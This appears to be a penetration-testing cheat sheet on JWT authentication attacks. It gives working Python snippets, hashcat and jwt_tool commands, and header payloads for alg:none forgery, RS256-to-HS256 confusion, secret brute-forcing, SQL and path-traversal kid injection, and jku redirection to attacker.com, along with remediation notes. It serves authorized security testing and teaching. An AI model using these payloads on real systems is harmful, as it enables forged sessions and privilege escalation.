# JWT Attacks

> **Modern library defaults:** `alg:none` and RS256->HS256 confusion were widespread around
> 2015-2018 and drove most major libraries (PyJWT, Node `jsonwebtoken` 4.2.2+, `jose`,
> java-jwt) to reject `alg:none` and require an explicit algorithm allowlist on verify by
> default. These attacks now mostly succeed against custom/rolled-by-hand verification logic,
> older pinned library versions, or code that calls a low-level decode function without an
> algorithm allowlist. Don't assume they fail on a hardened target without testing - but also
> don't expect a default-configured recent library to be vulnerable without one of those
> conditions.

## JWT Structure

```
header.payload.signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
header:  {"alg":"HS256","typ":"JWT"}
payload: {"sub":"1234567890","role":"user","exp":1700000000}
```

## 1. Algorithm None Attack

```python
import base64, json
def b64url(data): return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()
header  = b64url({"alg":"none","typ":"JWT"})
payload = b64url({"sub":"1","role":"admin","exp":9999999999})
token   = f"{header}.{payload}."   # empty signature
```
Also try casing variants: `"None"`, `"NONE"`, `"nOnE"`.

## 2. Algorithm Confusion: RS256 -> HS256

If the server uses RS256 (asymmetric), the public key is often published. Attack: tell the
server the token uses HS256, sign with the public key as the HMAC secret - the server verifies
HS256 using its own public key, which matches:
```bash
curl -s https://target.com/.well-known/jwks.json   # or /api/auth/keys, /oauth/jwks
jwt_tool EXISTING_TOKEN -X k -pk public_key.pem
```
```python
import jwt
pubkey = open('public.pem', 'rb').read()
forged = jwt.encode({"sub":"1","role":"admin","exp":9999999999}, pubkey, algorithm='HS256')
```

## 3. Weak Secret Brute Force

```bash
hashcat -a 0 -m 16500 jwt.txt rockyou.txt
john --wordlist=rockyou.txt --format=HMAC-SHA256 jwt.txt
jwt-cracker "FULL.JWT.TOKEN" -a "abcdefghijklmnopqrstuvwxyz" -l 6
```
Common weak secrets worth trying first: `secret`, `password`, `123456`,
`your-256-bit-secret`, `jwt_secret`, `APP_SECRET`, `dev_secret`, `changeme`, `supersecret`.

## 3.5 Client-Side JWT Signing - Secret Shipped in the Page

Distinct from weak-secret brute force: some apps generate AND sign the session JWT entirely in
browser JavaScript (via the Web Crypto API) with the HMAC key hardcoded directly in an inline
`<script>` block or a JS bundle. There's nothing to crack - view-source hands you the exact
signing key used for every session on the app:
```javascript
const SECRET_KEY = "some-hardcoded-value";
// crypto.subtle.importKey('raw', new TextEncoder().encode(SECRET_KEY), ...)
// crypto.subtle.sign('HMAC', key, ...) -> forms the session token client-side
```
Detection: pull the JS bundle on first page load and grep for `SECRET_KEY`, `crypto.subtle`,
`importKey`, `HMAC` near any code that also sets a cookie or Authorization header. Any app that
signs its own session tokens *in the browser* (as opposed to just decoding a server-issued one
for display) is signing with a key it necessarily also gave you. Exploitation: forge a token
for any payload with a standard HMAC-SHA256 signer using the exposed key. Root cause for the
report: session-token signing must happen exclusively server-side, with the key never leaving
the server - this holds even if the key were randomly generated per-session, because a client
that can sign its OWN token can sign anyone's.

## 4. kid (Key ID) Injection

`kid` tells the server which key to use for verification. If it's used in a file path or SQL
query, it's injectable:
```json
{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}
// sign with empty string as secret - /dev/null is empty, HMAC with "" is predictable

{"alg":"HS256","typ":"JWT","kid":"x' UNION SELECT 'attacker_secret' -- -"}
// server runs: SELECT key FROM keys WHERE id='x' UNION SELECT 'attacker_secret' -- -'
// sign your token with 'attacker_secret'
```
```bash
jwt_tool TOKEN -I -hc kid -hv "x' UNION SELECT 'attacker_secret' -- -" -S hs256 -p 'attacker_secret'
```

## 5. jku / x5u Header Injection

`jku` specifies a URL for the key set. If the server fetches keys from a URL the attacker
controls:
```bash
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem
# host a JWKS containing your public key, e.g. python3 -m http.server 8080
jwt_tool TOKEN -X j -ju "http://your-server.com/jwks.json"
```
If the server only allows keys from its own domain, try naive-prefix-check bypasses:
```
jku: https://target.com@attacker.com/jwks.json
jku: https://attacker.com/jwks.json#https://target.com
jku: https://target.com/jwks.json?url=https://attacker.com/jwks.json
```

## 6. jwk Header Embedding

Embed your own public key directly in the token header, sign with the matching private key.
Vulnerable servers trust the embedded key without validating it against a known set:
```bash
jwt_tool TOKEN -X s   # generates a keypair and embeds the public key in the header automatically
```

## 7. Claim Tampering (After Cracking/Forging the Secret)

```python
import jwt
secret = "cracked_secret"
decoded = jwt.decode(original_token, secret, algorithms=["HS256"])
decoded["role"] = "admin"
decoded["exp"] = 9999999999
forged = jwt.encode(decoded, secret, algorithm="HS256")
```

## 8. Expiration Bypass

```bash
# Take an expired token, change nothing, resubmit
curl -H "Authorization: Bearer EXPIRED_TOKEN" https://target.com/api/me
```
Some apps only validate `exp` on certain endpoints - try sensitive ones directly with an
expired token.

## 9. jwt_tool Cheat Sheet

```bash
jwt_tool TOKEN                             # decode, no verification
jwt_tool TOKEN -C -d rockyou.txt           # crack secret
jwt_tool TOKEN -T -S hs256 -p "secret"     # forge with known secret, edit claims interactively
jwt_tool TOKEN -X a                        # alg:none
jwt_tool TOKEN -X n                        # null signature
jwt_tool TOKEN -X s                        # self-signed (embedded jwk)
jwt_tool TOKEN -X j                        # jku injection
jwt_tool TOKEN -X k -pk public.pem         # RS256 -> HS256
```

## Checklist

- [ ] Decode JWT, check `alg` and claims
- [ ] Algorithm none attempted
- [ ] RS256->HS256 confusion (if RSA key available)
- [ ] Client-side signing checked - is the app signing JWTs in browser JS with an exposed key?
- [ ] Brute force HMAC secret
- [ ] `kid` injection (path traversal, SQLi)
- [ ] `jku`/`x5u` redirect to attacker-controlled key server
- [ ] `jwk` embedding attack
- [ ] Expiration validation tested with an expired token
- [ ] All privilege claims tampered after any successful attack above
